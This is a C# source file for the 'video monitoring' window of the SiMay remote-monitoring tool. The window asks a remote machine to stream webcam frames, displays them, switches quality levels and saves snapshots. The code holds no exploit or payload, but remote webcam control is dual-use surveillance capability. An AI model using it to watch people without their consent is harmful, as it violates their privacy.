using SiMay.Basic;
using SiMay.Core;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Net.SessionProvider.SessionBased;
using SiMay.RemoteMonitor.Attributes;
using SiMay.RemoteMonitor.ControlSource;
using SiMay.RemoteMonitor.Extensions;
using SiMay.RemoteMonitor.Notify;
using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;

using static SiMay.RemoteMonitor.Win32Api;

namespace SiMay.RemoteMonitor.Controls
{
    [ControlSource(30, "视频监控", "RemoteViedoJob", "ViedoManager")]
    public partial class ViedoManager : Form, IControlSource
    {
        private string _title = "//视频监控 #Name#";
        private MessageAdapter _adapter;
        private PacketModelBinder<SessionHandler> _handlerBinder = new PacketModelBinder<SessionHandler>();
        public ViedoManager(MessageAdapter adapter)
        {
            _adapter = adapter;
            adapter.OnSessionNotifyPro += Adapter_OnSessionNotifyPro;
            adapter.ResetMsg = this.GetType().GetControlKey();
            _title = _title.Replace("#Name#", adapter.OriginName);
            InitializeComponent();
        }
        public void Action()
            => this.Show();
        private void Adapter_OnSessionNotifyPro(SessionHandler session, SessionNotifyType notify)
        {
            switch (notify)
            {
                case SessionNotifyType.Message:
                    if (_adapter.WindowClosed)
                        return;

                    _handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);
                    break;
                case SessionNotifyType.OnReceive:
                    break;
                case SessionNotifyType.ContinueTask:

                    this.Text = _title;
                    _adapter.SendAsyncMessage(MessageHead.S_VIEDO_GET_DATA);

                    break;
                case SessionNotifyType.SessionClosed:
                    this.Text = _title + " [" + _adapter.TipText + "]";
                    break;
                case SessionNotifyType.WindowShow:
                    this.Show();
                    break;
                case SessionNotifyType.WindowClose:

                    _adapter.WindowClosed = true;
                    this.Close();

                    break;
                default:
                    break;
            }
        }
        [PacketHandler(MessageHead.C_VIEDO_DATA)]
        public void Playhandler(SessionHandler session)
        {
            var data = session.CompletedBuffer.GetMessageBody();
            using (MemoryStream ms = new MemoryStream(data))
                pictureBox.Image = Image.FromStream(ms);

            _adapter.SendAsyncMessage(MessageHead.S_VIEDO_GET_DATA);
        }

        [PacketHandler(MessageHead.C_VIEDO_DEVICE_NOTEXIST)]
        public void DeviceNotExisthandler(SessionHandler session)
        {
            this.ShowTip("视频打开失败,未检测到视频设备!");
        }

        const Int32 IDM_HEIGHT = 1000;
        const Int32 IDM_DEFAULT = 1001;
        const Int32 IDM_LOW = 1002;
        const Int32 IDM_SAVE = 1003;

        private void VedioManager_Load(object sender, EventArgs e)
        {
            this.Text = _title;
            this.ShowTip("视频帧加载中...");

            _adapter.SendAsyncMessage(MessageHead.S_VIEDO_GET_DATA);

            IntPtr sysMenuHandle = GetSystemMenu(this.Handle, false);

            InsertMenu(sysMenuHandle, 7, MF_SEPARATOR, 0, null);
            InsertMenu(sysMenuHandle, 8, MF_BYPOSITION, IDM_HEIGHT, "高画质");
            InsertMenu(sysMenuHandle, 9, MF_BYPOSITION, IDM_DEFAULT, "中画质");
            InsertMenu(sysMenuHandle, 10, MF_BYPOSITION, IDM_LOW, "低画质");
            InsertMenu(sysMenuHandle, 11, MF_SEPARATOR, 0, null);
            InsertMenu(sysMenuHandle, 12, MF_BYPOSITION, IDM_SAVE, "保存快照");

            CheckMenuItem(sysMenuHandle, IDM_DEFAULT, MF_CHECKED);
        }

        protected override void WndProc(ref Message m)
        {

            if (m.Msg == WM_SYSCOMMAND)
            {
                IntPtr sysMenuHandle = GetSystemMenu(m.HWnd, false);
                switch (m.WParam.ToInt64())
                {
                    case IDM_HEIGHT:
                        CheckMenuItem(sysMenuHandle, IDM_HEIGHT, MF_CHECKED);
                        CheckMenuItem(sysMenuHandle, IDM_DEFAULT, MF_UNCHECKED);
                        CheckMenuItem(sysMenuHandle, IDM_LOW, MF_UNCHECKED);

                        _adapter.SendAsyncMessage(MessageHead.S_VIEDO_RESET, new byte[] { 3 });

                        break;
                    case IDM_DEFAULT:

                        CheckMenuItem(sysMenuHandle, IDM_HEIGHT, MF_UNCHECKED);
                        CheckMenuItem(sysMenuHandle, IDM_DEFAULT, MF_CHECKED);
                        CheckMenuItem(sysMenuHandle, IDM_LOW, MF_UNCHECKED);

                        _adapter.SendAsyncMessage(MessageHead.S_VIEDO_RESET, new byte[] { 2 });
                        break;
                    case IDM_LOW:

                        CheckMenuItem(sysMenuHandle, IDM_HEIGHT, MF_UNCHECKED);
                        CheckMenuItem(sysMenuHandle, IDM_DEFAULT, MF_UNCHECKED);
                        CheckMenuItem(sysMenuHandle, IDM_LOW, MF_CHECKED);

                        _adapter.SendAsyncMessage(MessageHead.S_VIEDO_RESET, new byte[] { 1 });

                        break;
                    case IDM_SAVE:

                        string fileName = Application.StartupPath + "\\" + DateTime.Now.ToFileTime().ToString() + " 视频监控快照.bmp";
                        Bitmap img = new Bitmap(pictureBox.Image.Width, pictureBox.Image.Height);
                        Graphics g = Graphics.FromImage(img);
                        g.DrawImage(pictureBox.Image, 0, 0);
                        img.Save(fileName);
                        g.Dispose();
                        img.Dispose();
                        MessageBoxHelper.ShowBoxExclamation("快照已保存到:" + fileName);

                        break;
                }
            }
            base.WndProc(ref m);
        }

        private void ShowTip(string str)
        {
            if (pictureBox.Image != null)
                pictureBox.Image.Dispose();

            Bitmap bmap = new Bitmap(pictureBox.Width, pictureBox.Height);
            Graphics g = Graphics.FromImage(bmap);
            g.Clear(Color.Black);
            g.DrawString(str, new Font("微软雅黑", 10, FontStyle.Regular), new SolidBrush(Color.Red), new Point((pictureBox.Width / 2) - 100, pictureBox.Height / 2));
            g.Dispose();
            pictureBox.Image = bmap;
        }

        private void VedioManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            _handlerBinder.Dispose();
            _adapter.WindowClosed = true;
            _adapter.SendAsyncMessage(MessageHead.S_GLOBAL_ONCLOSE);
        }
    }
}